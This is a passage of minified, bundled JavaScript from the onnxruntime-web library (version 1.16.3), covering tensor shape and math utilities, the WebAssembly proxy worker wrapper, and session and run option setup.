onnx_1.onnx.TensorProto.DataType.INT8:return"int8";case onnx_1.onnx.TensorProto.DataType.UINT8:return"uint8";case onnx_1.onnx.TensorProto.DataType.BOOL:return"bool";case onnx_1.onnx.TensorProto.DataType.INT16:return"int16";case onnx_1.onnx.TensorProto.DataType.UINT16:return"uint16";case onnx_1.onnx.TensorProto.DataType.INT32:return"int32";case onnx_1.onnx.TensorProto.DataType.UINT32:return"uint32";case onnx_1.onnx.TensorProto.DataType.FLOAT:return"float32";case onnx_1.onnx.TensorProto.DataType.DOUBLE:return"float64";case onnx_1.onnx.TensorProto.DataType.STRING:return"string";case onnx_1.onnx.TensorProto.DataType.INT64:return"int32";case onnx_1.onnx.TensorProto.DataType.UINT64:return"uint32";default:throw new Error(`unsupported data type: ${onnx_1.onnx.TensorProto.DataType[typeProto]}`)}}static tensorDataTypeStringToEnum(type){switch(type){case"int8":return onnx_1.onnx.TensorProto.DataType.INT8;case"uint8":return onnx_1.onnx.TensorProto.DataType.UINT8;case"bool":return onnx_1.onnx.TensorProto.DataType.BOOL;case"int16":return onnx_1.onnx.TensorProto.DataType.INT16;case"uint16":return onnx_1.onnx.TensorProto.DataType.UINT16;case"int32":return onnx_1.onnx.TensorProto.DataType.INT32;case"uint32":return onnx_1.onnx.TensorProto.DataType.UINT32;case"float32":return onnx_1.onnx.TensorProto.DataType.FLOAT;case"float64":return onnx_1.onnx.TensorProto.DataType.DOUBLE;case"string":return onnx_1.onnx.TensorProto.DataType.STRING;case"int64":return onnx_1.onnx.TensorProto.DataType.INT64;case"uint64":return onnx_1.onnx.TensorProto.DataType.UINT64;default:throw new Error(`unsupported data type: ${type}`)}}static tensorDimsFromProto(dims){return dims.map((d=>long_1.default.isLong(d)?d.toNumber():d))}static tensorValueTypeFromProto(valueType){return{tensorType:ProtoUtil.tensorDataTypeFromProto(valueType.elemType),shape:{dims:ProtoUtil.tensorDimsFromProto(valueType.shape.dim.map((d=>d.dimValue)))}}}static tensorDimsFromORTFormat(tensor){const dims=[];for(let i=0;i<tensor.dimsLength();i++)dims.push(LongUtil.longToNumber(tensor.dims(i)));return dims}static tensorAttributesFromORTFormat(node){const attributes=[];for(let i=0;i<node.attributesLength();i++)attributes.push(node.attributes(i));return attributes}}exports.ProtoUtil=ProtoUtil;class LongUtil{static longToNumber(n,unsigned){return long_1.default.isLong(n)?n.toNumber():n instanceof flatbuffers_1.flatbuffers.Long?long_1.default.fromValue({low:n.low,high:n.high,unsigned:null!=unsigned&&unsigned}).toNumber():n}static isLong(n){return long_1.default.isLong(n)||n instanceof flatbuffers_1.flatbuffers.Long}}exports.LongUtil=LongUtil;class ShapeUtil{static size(dims){return ShapeUtil.getSizeFromDimensionRange(dims,0,dims.length)}static sizeFromDimension(dims,axis){if(axis<0||axis>dims.length)throw new Error(`invalid dimension of ${axis} for sizeFromDimension as Tensor has ${dims.length} dimensions.`);return ShapeUtil.getSizeFromDimensionRange(dims,axis,dims.length)}static sizeToDimension(dims,axis){if(axis<0||axis>dims.length)throw new Error(`invalid dimension of ${axis} for sizeToDimension as Tensor has ${dims.length} dimensions.`);return ShapeUtil.getSizeFromDimensionRange(dims,0,axis)}static getSizeFromDimensionRange(dims,start,end){let size=1;for(let i=start;i<end;i++){if(dims[i]<=0)throw new Error("cannot get valid size from specified dimension range. Most likely the range contains 0 or negative values in them.");size*=dims[i]}return size}static computeStrides(dims){const rank=dims.length;if(0===rank)return[];if(1===rank)return[1];const strides=new Array(rank);strides[rank-1]=1,strides[rank-2]=dims[rank-1];for(let i=rank-3;i>=0;--i)strides[i]=strides[i+1]*dims[i+1];return strides}static transpose(dims){return dims.slice().reverse()}static indicesToOffset(indices,strides,axis){void 0===axis&&(axis=indices.length);let offset=0;for(let i=0;i<axis;++i)offset+=strides[i]*indices[i];return offset}static offsetToIndices(offset,strides){const rank=strides.length;if(0===rank)return[];if(1===rank)return[offset*strides[0]];const indices=new Array(strides.length);for(let i=0;i<indices.length-1;++i)indices[i]=Math.floor(offset/strides[i]),offset-=indices[i]*strides[i];return indices[indices.length-1]=offset,indices}static normalizeAxis(axis,tensorRank){if(axis<-tensorRank&&axis>=tensorRank)throw new Error("unsupported axis for this operation.");return axis<0?axis+tensorRank:axis}static normalizeAxes(axes,tensorRank){return axes.map((x=>this.normalizeAxis(x,tensorRank)))}static incrementIndex(index,dims,axisToIncrementOn){if(0===dims.length||0===index.length)throw new Error("Index incrementing unsupported for scalar Tensor");if(void 0===axisToIncrementOn)axisToIncrementOn=dims.length;else if(axisToIncrementOn<=0||axisToIncrementOn>dims.length)throw new Error("Incorrect axis to increment on");for(let k=axisToIncrementOn-1;k>=0&&(index[k]++,!(index[k]<dims[k]));--k)index[k]=0}static calculateReshapedDims(originalDims,shapeHints){if(0===shapeHints.length){if(0===originalDims.length||1===ShapeUtil.size(originalDims))return[];throw new Error("cannot reshape to a scalar Tensor")}const nDims=shapeHints.length,reshapedDims=new Array(nDims);let unknownDimension=-1,newTensorSize=1;for(let i=0;i<nDims;i++){if(shapeHints[i]<-1)throw new Error("a dimension in shape hints cannot be less than -1");if(-1===shapeHints[i]){if(-1!==unknownDimension)throw new Error("at most one dimension in shape hints can be -1");unknownDimension=i}else{if(0===shapeHints[i]){if(i>=originalDims.length)throw new Error("the dimension with value zero exceeds the dimension size of the input tensor");reshapedDims[i]=originalDims[i]}else reshapedDims[i]=shapeHints[i];newTensorSize*=reshapedDims[i]}}const oldTensorSize=ShapeUtil.size(originalDims);if(-1!==unknownDimension){if(oldTensorSize%newTensorSize!=0)throw new Error(`the input tensor cannot be reshaped to the requested shape. Input shape: [${originalDims}] Output shape: [${shapeHints}]`);reshapedDims[unknownDimension]=oldTensorSize/newTensorSize}else if(newTensorSize!==oldTensorSize)throw new Error("reshapedDims and originalDims don't have matching sizes");return reshapedDims}static sortBasedOnPerm(a,perm){return perm?perm.map((v=>a[v])):a.slice().reverse()}static padShape(dims,pad){const rank=dims.length;return dims.map(((v,i)=>v+pad[i]+pad[i+rank]))}static areEqual(shape1,shape2){return shape1.length===shape2.length&&shape1.every(((v,i)=>v===shape2[i]))}static validateDimsAndCalcSize(dims){if(dims.length>6)throw new TypeError("Only rank 0 to 6 is supported for tensor shape.");let size=1;for(const n of dims){if(!Number.isInteger(n))throw new TypeError(`Invalid shape: ${n} is not an integer`);if(n<0||n>2147483647)throw new TypeError(`Invalid shape: length ${n} is not allowed`);size*=n}return size}static flattenShape(dims,axis){axis<0&&(axis+=dims.length);const total=dims.reduce(((x,y)=>x*y),1),right=dims.slice(axis).reduce(((x,y)=>x*y),1);return[total/right,right]}static squeezeShape(dims,axes){const outputDims=new Array;axes=ShapeUtil.normalizeAxes(axes,dims.length);for(let i=0;i<dims.length;i++){const inSqueezeList=axes.indexOf(i)>=0;if(inSqueezeList&&1!==dims[i])throw new Error("squeeze an axis of size different than 1");(0===axes.length&&dims[i]>1||axes.length>0&&!inSqueezeList)&&outputDims.push(dims[i])}return outputDims}static unsqueezeShape(dims,axes){const outputDims=new Array(dims.length+axes.length);outputDims.fill(0);for(let i=0;i<axes.length;i++){const axis=ShapeUtil.normalizeAxis(axes[i],outputDims.length);if(axis>=outputDims.length)throw new Error("'axes' has an out of range axis");if(0!==outputDims[axis])throw new Error("'axes' has a duplicate axis");outputDims[axis]=1}let inputDimsIterator=0;for(let i=0;i<outputDims.length;i++)0===outputDims[i]&&(outputDims[i]=dims[inputDimsIterator++]);if(inputDimsIterator!==dims.length)throw new Error("the unsqueezed dimension could not be established");return outputDims}}exports.ShapeUtil=ShapeUtil;exports.MathUtil=class MathUtil{static sqr(target,source,targetIndex,sourceIndex,blockSize){if(sourceIndex<0||sourceIndex>=source.length)throw new Error("sourceIndex out of bounds");if(targetIndex<0||targetIndex>=target.length)throw new Error("targetIndex out of bounds");if(sourceIndex+blockSize>source.length)throw new Error("source indices to be copied are outside bounds");if(targetIndex+blockSize>target.length)throw new Error("target array is too small to hold result");for(let offset=0;offset<blockSize;offset++)target[targetIndex+offset]+=Math.pow(source[sourceIndex+offset],2)}static axpy(target,source,targetIndex,sourceIndex,blockSize,alpha){if(sourceIndex<0||sourceIndex>=source.length)throw new Error("sourceIndex out of bounds");if(targetIndex<0||targetIndex>=target.length)throw new Error("targetIndex out of bounds");if(sourceIndex+blockSize>source.length)throw new Error("source indices to be copied are outside bounds");if(targetIndex+blockSize>target.length)throw new Error("target array is too small to hold result");for(let offset=0;offset<blockSize;offset++)target[targetIndex+offset]+=alpha*source[sourceIndex+offset]}static powx(target,source,targetIndex,sourceIndex,blockSize,b){if(sourceIndex<0||sourceIndex>=source.length)throw new Error("sourceIndex out of bounds");if(targetIndex<0||targetIndex>=target.length)throw new Error("targetIndex out of bounds");if(sourceIndex+blockSize>source.length)throw new Error("source indices to be copied are outside bounds");if(targetIndex+blockSize>target.length)throw new Error("target array is too small to hold result");for(let offset=0;offset<blockSize;offset++)target[targetIndex+offset]=Math.pow(source[sourceIndex+offset],b)}static mul(target,source,targetIndex,sourceIndex,blockSize){if(sourceIndex<0||sourceIndex>=source.length)throw new Error("sourceIndex out of bounds");if(targetIndex<0||targetIndex>=target.length)throw new Error("targetIndex out of bounds");if(sourceIndex+blockSize>source.length)throw new Error("source indices to be copied are outside bounds");if(targetIndex+blockSize>target.length)throw new Error("target array is too small to hold result");for(let offset=0;offset<blockSize;offset++)target[targetIndex+offset]=source[sourceIndex+offset]*target[targetIndex+offset]}};class SplitUtil{static splitShape(dims,axis,split,numOutputs){if(0===split.length){if(!numOutputs)throw new Error("need to know number of outputs when the 'split' attribute is not specified");SplitUtil.determineSplit(dims[axis],numOutputs,split)}const shapes=[],offsets=[0];for(let i=0;i<split.length;++i){0!==i&&offsets.push(offsets[i-1]+split[i-1]);const shape=dims.slice();shape[axis]=split[i],shapes.push(shape)}return[shapes,offsets]}static determineSplit(numElementsAlongAxis,numOutputs,split){if(numElementsAlongAxis%numOutputs!=0)throw new Error("cannot split tensor to equal sized parts");for(let i=0;i<numOutputs;++i)split.push(numElementsAlongAxis/numOutputs)}}exports.SplitUtil=SplitUtil;class ReduceUtil{static calcReduce(a,axes,keepdims,op1,op2){const dims=a.dims.slice(0);0===axes.length&&dims.forEach(((d,ind)=>axes.push(ind)));const outputDims=ReduceUtil.calcReduceShape(dims,axes,!0),size=ShapeUtil.size(outputDims),y=new tensor_1.Tensor(outputDims,a.type),strides=ShapeUtil.computeStrides(outputDims),inputStrides=ShapeUtil.computeStrides(dims),indicesY=new Array(dims.length);for(let i=0;i<size;i++){const indices=ShapeUtil.offsetToIndices(i,strides);BroadcastUtil.fillIndex(indices,dims,indicesY),y.set(indices,ReduceUtil.calcReduceByAxis(a.numberData,axes,dims,0,ShapeUtil.indicesToOffset(indicesY,inputStrides),op1,op2))}return keepdims?y:new tensor_1.Tensor(ReduceUtil.calcReduceShape(dims,axes,keepdims),y.type,void 0,void 0,y.data,y.dataId)}static calcReduceByAxis(input,axes,dims,curAxisInd,pos,op1,op2){let res=0;if(curAxisInd>=axes.length)return op1(input[pos]);const axis=axes[curAxisInd],step=axis>=dims.length?1:ShapeUtil.size(dims.slice(axis+1));for(let i=0;i<dims[axis];i++)res=0===i?ReduceUtil.calcReduceByAxis(input,axes,dims,curAxisInd+1,pos,op1,op2):op2(res,ReduceUtil.calcReduceByAxis(input,axes,dims,curAxisInd+1,pos,op1,op2)),pos+=step;return res}static calcReduceShape(dims,axes,keepDims){const outputDims=dims.slice();for(let i=0;i<axes.length;i++)outputDims[axes[i]]=keepDims?1:0;return outputDims.filter((dim=>0!==dim))}}exports.ReduceUtil=ReduceUtil;class PoolConvUtil{static adjustPoolAttributes(isGlobalOperator,inputDims,kernelShape,strides,dilations,pads){if(!isGlobalOperator&&kernelShape.length!==inputDims.length-2)throw new Error("length of specified kernel shapes should be 2 less than length of input dimensions");if(isGlobalOperator)for(let dim=0;dim<inputDims.length-2;dim++)dim>=kernelShape.length?kernelShape.push(inputDims[dim+2]):kernelShape[dim]=inputDims[dim+2];for(let dim=0;dim<kernelShape.length;dim++)if(dim<strides.length){if(strides[dim]<0)throw new Error("strides should be greater than or equal to 1")}else strides.push(1);for(let dim=0;dim<kernelShape.length;dim++)if(dim<dilations.length){if(dilations[dim]<0)throw new Error("dilations should be greater than or equal to 1")}else dilations.push(1);for(let dim=0;dim<2*kernelShape.length;dim++)if(dim<pads.length){if(pads[dim]<0)throw new Error("pad should be greater than or equal to 1")}else pads.push(0);for(let dim=0;dim<kernelShape.length;dim++){if(kernelShape[dim]<=0)throw new Error("kernel shapes need to be greater than 0");if(pads[dim]>=kernelShape[dim]||pads[dim+kernelShape.length]>=kernelShape[dim])throw new Error("pads should be smaller than kernel")}}static adjustPadsBasedOnAutoPad(inputDims,strides,dilations,kernelShape,pads,autoPad){if(autoPad){if(pads.length!==2*(inputDims.length-2))throw new Error("length of pads should be twice the length of data dimensions");if(strides.length!==inputDims.length-2)throw new Error("length of strides should be the length of data dimensions");if(kernelShape.length!==inputDims.length-2)throw new Error("length of kernel shapes should be the length of data dimensions");for(let dim=0;dim<inputDims.length-2;dim++)PoolConvUtil.adjustPadAndReturnShape(inputDims[dim+2],strides[dim],dilations[dim],kernelShape[dim],pads,dim,dim+inputDims.length-2,autoPad)}}static computePoolOutputShape(isGlobalOperator,inputDims,strides,dilations,kernelShape,pads,autoPad){if(inputDims.length<=0)throw new Error("input shape must be of size greater than 0");const outputDims=[inputDims[0],inputDims[1]];return PoolConvUtil.computeShapeHelper(isGlobalOperator,inputDims,outputDims,strides,dilations,kernelShape,pads,autoPad),outputDims}static computeConvOutputShape(inputDims,filterDims,strides,dilations,kernelShape,pads,autoPad){if(inputDims.length<=0||filterDims.length<=0)throw new Error("invalid input tensor dims or invalid filter tensor dims");const outputDims=[inputDims[0],filterDims[0]];return PoolConvUtil.computeShapeHelper(!1,inputDims,outputDims,strides,dilations,kernelShape,pads,autoPad),outputDims}static computeShapeHelper(isGlobalOperator,inputDims,outputDims,strides,dilations,kernelShape,pads,autoPad){if(isGlobalOperator)for(let dim=0;dim<inputDims.length-2;dim++)outputDims.push(1);else for(let dim=0;dim<inputDims.length-2;dim++)outputDims.push(PoolConvUtil.adjustPadAndReturnShape(inputDims[dim+2],strides[dim],dilations[dim],kernelShape[dim],pads,dim,dim+inputDims.length-2,autoPad))}static adjustPadAndReturnShape(inSize,stride,dilation,kernel,pads,padHeadIndex,padTailIndex,autoPad){const dkernel=dilation*(kernel-1)+1;if(!autoPad||"NOTSET"===autoPad)return Math.floor((inSize+pads[padHeadIndex]+pads[padTailIndex]-dkernel)/stride+1);switch(autoPad){case"VALID":return pads[padHeadIndex]=0,pads[padTailIndex]=0,Math.floor((inSize-dkernel)/stride+1);case"SAME_LOWER":case"SAME_UPPER":if(1!==dilation)throw new Error("Dilation not supported for SAME_UPPER or SAME_LOWER");{const padNeeded=((inSize+stride-1)/stride-1)*stride+kernel-inSize;return pads[padHeadIndex]="SAME_LOWER"===autoPad?Math.floor((padNeeded+1)/2):Math.floor(padNeeded/2),pads[padTailIndex]=padNeeded-pads[padHeadIndex],Math.floor((inSize+padNeeded-kernel)/stride+1)}default:throw new Error("Unsupported AutoPad type")}}}exports.PoolConvUtil=PoolConvUtil,exports.MIN_CLIP=-34028234663852886e22,exports.MAX_CLIP=34028234663852886e22,exports.decodeUtf8String=function decodeUtf8String(buffer){return(new TextDecoder).decode(buffer)}},"./lib/version.ts":(__unused_webpack_module,exports)=>{"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.version=void 0,exports.version="1.16.3"},"./lib/wasm/proxy-wrapper.ts":function(__unused_webpack_module,exports,__webpack_require__){"use strict";var _a,__createBinding=this&&this.__createBinding||(Object.create?function(o,m,k,k2){void 0===k2&&(k2=k);var desc=Object.getOwnPropertyDescriptor(m,k);desc&&!("get"in desc?!m.__esModule:desc.writable||desc.configurable)||(desc={enumerable:!0,get:function(){return m[k]}}),Object.defineProperty(o,k2,desc)}:function(o,m,k,k2){void 0===k2&&(k2=k),o[k2]=m[k]}),__setModuleDefault=this&&this.__setModuleDefault||(Object.create?function(o,v){Object.defineProperty(o,"default",{enumerable:!0,value:v})}:function(o,v){o.default=v}),__importStar=this&&this.__importStar||function(mod){if(mod&&mod.__esModule)return mod;var result={};if(null!=mod)for(var k in mod)"default"!==k&&Object.prototype.hasOwnProperty.call(mod,k)&&__createBinding(result,mod,k);return __setModuleDefault(result,mod),result};Object.defineProperty(exports,"__esModule",{value:!0}),exports.endProfiling=exports.run=exports.releaseSession=exports.createSession=exports.createSessionFinalize=exports.createSessionAllocate=exports.initializeRuntime=exports.initializeWebAssemblyInstance=void 0;const onnxruntime_common_1=__webpack_require__("../common/dist/cjs/index.js"),core=__importStar(__webpack_require__("./lib/wasm/wasm-core-impl.ts")),wasm_factory_1=__webpack_require__("./lib/wasm/wasm-factory.ts"),isProxy=()=>!!onnxruntime_common_1.env.wasm.proxy&&"undefined"!=typeof document;let proxyWorker,initWasmCallbacks,initOrtCallbacks,initializing=!1,initialized=!1,aborted=!1;const createSessionAllocateCallbacks=[],createSessionFinalizeCallbacks=[],createSessionCallbacks=[],releaseSessionCallbacks=[],runCallbacks=[],endProfilingCallbacks=[],ensureWorker=()=>{if(initializing||!initialized||aborted||!proxyWorker)throw new Error("worker not ready")},onProxyWorkerMessage=ev=>{switch(ev.data.type){case"init-wasm":initializing=!1,ev.data.err?(aborted=!0,initWasmCallbacks[1](ev.data.err)):(initialized=!0,initWasmCallbacks[0]());break;case"init-ort":ev.data.err?initOrtCallbacks[1](ev.data.err):initOrtCallbacks[0]();break;case"create_allocate":ev.data.err?createSessionAllocateCallbacks.shift()[1](ev.data.err):createSessionAllocateCallbacks.shift()[0](ev.data.out);break;case"create_finalize":ev.data.err?createSessionFinalizeCallbacks.shift()[1](ev.data.err):createSessionFinalizeCallbacks.shift()[0](ev.data.out);break;case"create":ev.data.err?createSessionCallbacks.shift()[1](ev.data.err):createSessionCallbacks.shift()[0](ev.data.out);break;case"release":ev.data.err?releaseSessionCallbacks.shift()[1](ev.data.err):releaseSessionCallbacks.shift()[0]();break;case"run":ev.data.err?runCallbacks.shift()[1](ev.data.err):runCallbacks.shift()[0](ev.data.out);break;case"end-profiling":ev.data.err?endProfilingCallbacks.shift()[1](ev.data.err):endProfilingCallbacks.shift()[0]()}},scriptSrc="undefined"!=typeof document?null===(_a=null===document||void 0===document?void 0:document.currentScript)||void 0===_a?void 0:_a.src:void 0;exports.initializeWebAssemblyInstance=async()=>{if(isProxy()){if(initialized)return;if(initializing)throw new Error("multiple calls to 'initWasm()' detected.");if(aborted)throw new Error("previous call to 'initWasm()' failed.");return initializing=!0,void 0===onnxruntime_common_1.env.wasm.wasmPaths&&scriptSrc&&0!==scriptSrc.indexOf("blob:")&&(onnxruntime_common_1.env.wasm.wasmPaths=scriptSrc.substr(0,+scriptSrc.lastIndexOf("/")+1)),new Promise(((resolve,reject)=>{null==proxyWorker||proxyWorker.terminate(),proxyWorker=__webpack_require__("../node_modules/worker-loader/dist/cjs.js?inline=no-fallback!./lib/wasm/proxy-worker/main.ts").default(),proxyWorker.onmessage=onProxyWorkerMessage,initWasmCallbacks=[resolve,reject];const message={type:"init-wasm",in:onnxruntime_common_1.env.wasm};proxyWorker.postMessage(message)}))}return(0,wasm_factory_1.initializeWebAssembly)(onnxruntime_common_1.env.wasm)};exports.initializeRuntime=async env=>{if(isProxy())return ensureWorker(),new Promise(((resolve,reject)=>{initOrtCallbacks=[resolve,reject];const message={type:"init-ort",in:env};proxyWorker.postMessage(message)}));await core.initRuntime(env)};exports.createSessionAllocate=async model=>isProxy()?(ensureWorker(),new Promise(((resolve,reject)=>{createSessionAllocateCallbacks.push([resolve,reject]);const message={type:"create_allocate",in:{model:model}};proxyWorker.postMessage(message,[model.buffer])}))):core.createSessionAllocate(model);exports.createSessionFinalize=async(modeldata,options)=>isProxy()?(ensureWorker(),new Promise(((resolve,reject)=>{createSessionFinalizeCallbacks.push([resolve,reject]);const message={type:"create_finalize",in:{modeldata:modeldata,options:options}};proxyWorker.postMessage(message)}))):core.createSessionFinalize(modeldata,options);exports.createSession=async(model,options)=>isProxy()?(ensureWorker(),new Promise(((resolve,reject)=>{createSessionCallbacks.push([resolve,reject]);const message={type:"create",in:{model:model,options:options}};proxyWorker.postMessage(message,[model.buffer])}))):core.createSession(model,options);exports.releaseSession=async sessionId=>{if(isProxy())return ensureWorker(),new Promise(((resolve,reject)=>{releaseSessionCallbacks.push([resolve,reject]);const message={type:"release",in:sessionId};proxyWorker.postMessage(message)}));core.releaseSession(sessionId)};exports.run=async(sessionId,inputIndices,inputs,outputIndices,options)=>isProxy()?(ensureWorker(),new Promise(((resolve,reject)=>{runCallbacks.push([resolve,reject]);const message={type:"run",in:{sessionId:sessionId,inputIndices:inputIndices,inputs:inputs,outputIndices:outputIndices,options:options}};proxyWorker.postMessage(message,core.extractTransferableBuffers(inputs))}))):core.run(sessionId,inputIndices,inputs,outputIndices,options);exports.endProfiling=async sessionId=>{if(isProxy())return ensureWorker(),new Promise(((resolve,reject)=>{endProfilingCallbacks.push([resolve,reject]);const message={type:"end-profiling",in:sessionId};proxyWorker.postMessage(message)}));core.endProfiling(sessionId)}},"./lib/wasm/run-options.ts":(__unused_webpack_module,exports,__webpack_require__)=>{"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.setRunOptions=void 0;const wasm_factory_1=__webpack_require__("./lib/wasm/wasm-factory.ts"),wasm_utils_1=__webpack_require__("./lib/wasm/wasm-utils.ts");exports.setRunOptions=options=>{const wasm=(0,wasm_factory_1.getInstance)();let runOptionsHandle=0;const allocs=[],runOptions=options||{};try{if(void 0===(null==options?void 0:options.logSeverityLevel))runOptions.logSeverityLevel=2;else if("number"!=typeof options.logSeverityLevel||!Number.isInteger(options.logSeverityLevel)||options.logSeverityLevel<0||options.logSeverityLevel>4)throw new Error(`log serverity level is not valid: ${options.logSeverityLevel}`);if(void 0===(null==options?void 0:options.logVerbosityLevel))runOptions.logVerbosityLevel=0;else if("number"!=typeof options.logVerbosityLevel||!Number.isInteger(options.logVerbosityLevel))throw new Error(`log verbosity level is not valid: ${options.logVerbosityLevel}`);void 0===(null==options?void 0:options.terminate)&&(runOptions.terminate=!1);let tagDataOffset=0;return void 0!==(null==options?void 0:options.tag)&&(tagDataOffset=(0,wasm_utils_1.allocWasmString)(options.tag,allocs)),runOptionsHandle=wasm._OrtCreateRunOptions(runOptions.logSeverityLevel,runOptions.logVerbosityLevel,!!runOptions.terminate,tagDataOffset),0===runOptionsHandle&&(0,wasm_utils_1.checkLastError)("Can't create run options."),void 0!==(null==options?void 0:options.extra)&&(0,wasm_utils_1.iterateExtraOptions)(options.extra,"",new WeakSet,((key,value)=>{const keyDataOffset=(0,wasm_utils_1.allocWasmString)(key,allocs),valueDataOffset=(0,wasm_utils_1.allocWasmString)(value,allocs);0!==wasm._OrtAddRunConfigEntry(runOptionsHandle,keyDataOffset,valueDataOffset)&&(0,wasm_utils_1.checkLastError)(`Can't set a run config entry: ${key} - ${value}.`)})),[runOptionsHandle,allocs]}catch(e){throw 0!==runOptionsHandle&&wasm._OrtReleaseRunOptions(runOptionsHandle),allocs.forEach((alloc=>wasm._free(alloc))),e}}},"./lib/wasm/session-handler.ts":(__unused_webpack_module,exports,__webpack_require__)=>{"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.OnnxruntimeWebAssemblySessionHandler=void 0;const fs_1=__webpack_require__("?295d"),onnxruntime_common_1=__webpack_require__("../common/dist/cjs/index.js"),util_1=__webpack_require__("?cf98"),proxy_wrapper_1=__webpack_require__("./lib/wasm/proxy-wrapper.ts");let runtimeInitialized;exports.OnnxruntimeWebAssemblySessionHandler=class OnnxruntimeWebAssemblySessionHandler{async createSessionAllocate(path){const response=await fetch(path);if(200!==response.status)throw new Error(`failed to load model: ${path}`);const arrayBuffer=await response.arrayBuffer();return(0,proxy_wrapper_1.createSessionAllocate)(new Uint8Array(arrayBuffer))}async loadModel(pathOrBuffer,options){if(runtimeInitialized||(await(0,proxy_wrapper_1.initializeRuntime)(onnxruntime_common_1.env),runtimeInitialized=!0),"string"==typeof pathOrBuffer)if("undefined"!=typeof process&&process.versions&&process.versions.node){const model=await(0,util_1.promisify)(fs_1.readFile)(pathOrBuffer);[this.sessionId,this.inputNames,this.outputNames]=await(0,proxy_wrapper_1.createSession)(model,options)}else{const modelData=await this.createSessionAllocate(pathOrBuffer);[this.sessionId,this.inputNames,this.outputNames]=await(0,proxy_wrapper_1.createSessionFinalize)(modelData,options)}else[this.sessionId,this.inputNames,this.outputNames]=await(0,proxy_wrapper_1.createSession)(pathOrBuffer,options)}async dispose(){return(0,proxy_wrapper_1.releaseSession)(this.sessionId)}async run(feeds,fetches,options){const inputArray=[],inputIndices=[];Object.entries(feeds).forEach((kvp=>{const name=kvp[0],tensor=kvp[1],index=this.inputNames.indexOf(name);if(-1===index)throw new Error(`invalid input '${name}'`);inputArray.push(tensor),inputIndices.push(index)}));const outputIndices=[];Object.entries(fetches).forEach((kvp=>{const name=kvp[0],index=this.outputNames.indexOf(name);if(-1===index)throw new Error(`invalid output '${name}'`);outputIndices.push(index)}));const outputs=await(0,proxy_wrapper_1.run)(this.sessionId,inputIndices,inputArray.map((t=>[t.type,t.dims,t.data])),outputIndices,options),result={};for(let i=0;i<outputs.length;i++)result[this.outputNames[outputIndices[i]]]=new onnxruntime_common_1.Tensor(outputs[i][0],outputs[i][2],outputs[i][1]);return result}startProfiling(){}endProfiling(){(0,proxy_wrapper_1.endProfiling)(this.sessionId)}}},"./lib/wasm/session-options.ts":(__unused_webpack_module,exports,__webpack_require__)=>{"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.setSessionOptions=void 0;const wasm_factory_1=__webpack_require__("./lib/wasm/wasm-factory.ts"),wasm_utils_1=__webpack_require__("./lib/wasm/wasm-utils.ts");exports.setSessionOptions=options=>{var _a,_b,_c,_d;const wasm=(0,wasm_factory_1.getInstance)();let sessionOptionsHandle=0;const allocs=[],sessionOptions=options||{};(options=>{options.extra||(options.extra={}),options.extra.session||(options.extra.session={});const session=options.extra.session;session.use_ort_model_bytes_directly||(session.use_ort_model_bytes_directly="1"),options.executionProviders&&options.executionProviders.some((ep=>"webgpu"===("string"==typeof ep?ep:ep.name)))&&(options.enableMemPattern=!1)})(sessionOptions);try{const graphOptimizationLevel=(graphOptimizationLevel=>{switch(graphOptimizationLevel){case"disabled":return 0;case"basic":return 1;case"extended":return 2;case"all":return 99;default:throw new Error(`unsupported graph optimization level: ${graphOptimizationLevel}`)}})(null!==(_a=sessionOptions.graphOptimizationLevel)&&void 0!==_a?_a:"all"),executionMode=(executionMode=>{switch(executionMode){case"sequential":return 0;case"parallel":return 1;default:throw new Error(`unsupported execution mode: ${executionMode}`)}})(null!==(_b=sessionOptions.executionMode)&&void 0!==_b?_b:"sequential"),logIdDataOffset="string"==typeof sessionOptions.logId?(0,wasm_utils_1.allocWasmString)(sessionOptions.logId,allocs):0,logSeverityLevel=null!==(_c=sessionOptions.logSeverityLevel)&&void 0!==_c?_c:2;if(!Number.isInteger(logSeverityLevel)||logSeverityLevel<0||logSeverityLevel>4)throw new Error(`log serverity level is not valid: ${logSeverityLevel}`);const logVerbosityLevel=null!==(_d=sessionOptions.logVerbosityLevel)&&void 0!==_d?_d:0;if(!Number.isInteger(logVerbosityLevel)||logVerbosityLevel<0||logVerbosityLevel>4)throw new Error(`log verbosity level is not valid: ${logVerbosityLevel}`);const optimizedModelFilePathOffset="string"==typeof sessionOptions.optimizedModelFilePath?(0,wasm_utils_1.allocWasmString)(sessionOptions.optimizedModelFilePath,allocs):0;return sessionOptionsHandle=wasm._OrtCreateSessionOptions(graphOptimizationLevel,!!sessionOptions.enableCpuMemArena,!!sessionOptions.enableMemPattern,executionMode,!!sessionOptions.enableProfiling,0,logIdDataOffset,logSeverityLevel,logVerbosityLevel,optimizedModelFilePathOffset),0===sessionOptionsHandle&&(0,wasm_utils_1.checkLastError)("Can't create session options."),sessionOptions.executionProviders&&((sessionOptionsHandle,executionProviders,allocs)=>{for(const ep of executionProviders){let epName="string"==typeof ep?ep:ep.name;switch(epName){case"xnnpack":epName="XNNPACK";break;case"webnn":if(epName="WEBNN","string"!=typeof ep){const webnnOptions=ep;if(null==webnnOptions?void 0:webnnOptions.deviceType){const keyDataOffset=(0,wasm_utils_1.allocWasmString)("deviceType",allocs),valueDataOffset=(0,wasm_utils_1.allocWasmString)(webnnOptions.deviceType,allocs);0!==(0,wasm_factory_1.getInstance)()._OrtAddSessionConfigEntry(sessionOptionsHandle,keyDataOffset,valueDataOffset)&&(0,wasm_utils_1.checkLastError)(`Can't set a session config entry: 'deviceType' - ${webnnOptions.deviceType}.`)}if(null==webnnOptions?void 0:webnnOptions.powerPreference){const keyDataOffset=(0,wasm_utils_1.allocWasmString)("powerPreference",allocs),valueDataOffset=(0,wasm_utils_1.allocWasmString)(webnnOptions.powerPreference,allocs);0!==(0,wasm_factory_1.getInstance)()._OrtAddSessionConfigEntry(sessionOptionsHandle,keyDataOffset,valueDataOffset)&&(0,wasm_utils_1.checkLastError)(`Can't set a session config entry: 'powerPreference' - ${webnnOptions.powerPreference}.`)}}break;case"webgpu":epName="JS";break;case"wasm":case"cpu":continue;default:throw new Error(`not supported execution provider: ${epName}`)}const epNameDataOffset=(0,wasm_utils_1.allocWasmString)(epName,allocs);0!==(0,wasm_factory_1.getInstance)()._OrtAppendExecutionProvider(sessionOptionsHandle,epNameDataOffset)&&(0,wasm_utils_1.checkLastError)(`Can't append execution provider: ${epName}.`)}})(sessionOptionsHandle,sessionOptions.executionProviders,allocs),void 